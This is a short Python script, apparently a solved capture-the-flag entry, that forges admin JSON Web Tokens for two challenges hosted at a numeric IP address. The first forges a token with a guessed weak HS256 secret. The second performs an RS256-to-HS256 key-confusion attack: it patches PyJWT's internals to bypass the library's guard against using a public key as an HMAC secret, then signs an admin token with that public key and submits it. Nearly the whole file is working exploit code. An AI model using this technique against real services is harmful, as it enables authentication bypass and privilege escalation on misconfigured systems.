# resolved
import jwt
import requests

"""                             JWT 1.0                     """
enc1 = jwt.encode({"name": "isAdmin", "isAdmin": True}, "CODEBY{", algorithm="HS256")
curl = f'http://62.173.140.174:16007/check-jwt/{enc1}'
r = (requests.get(curl)).text
print(r)
# dec = jwt.decode(flag, "CODEBY{", algorithms=["HS256"])
# print(dec)

"""                             JWT 2.0                     """

public_key = open('pub.key.pem').read()
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiaXNBZG1pbiIsImlzQWRtaW4iOmZhbHNlfQ.DFUJZRLu1MrsgxFWHtdY3WWGkBoY81QaYUJaATDeh4K-RV3Qm_oDRMWwB2TIyG1wLdIbgTgUhnJwDXoMISKXo6kxc5LoJbrmJT3jMP27JJG7_BFNwUNyXiKNnAKRhHpM0mU49W3ACSO8FrGotnFCmy6Kn4H3JqjeJpcLq0N9obufb_yWgsNio2l8QUrGnS_Kd1ADWBDxZOclngc5u3Ls9x9LRgFch526wGW92zPm_b7ObO4ZoPG0zA_4HthfZgoZWZXtC088Pofg0op07zLWArmR6eJQ5hQLr1OsTyMyUz3bJ4jUn9WRwRZDdTWFk5rPkp3JKDsMvXhIf9q4GopvLA"


def prepare_key(key):
    return jwt.utils.force_bytes(key)


jwt.api_jws._jws_global_obj._algorithms['HS256'].prepare_key = prepare_key
public_key = open('pub.key.pem', 'r').read()
token = jwt.encode({"name": 'isAdmin', "isAdmin": True}, key=public_key, algorithm='HS256')
curl = f'http://62.173.140.174:16005/check-jwt/{token}'
r = (requests.get(curl)).text
print(r)
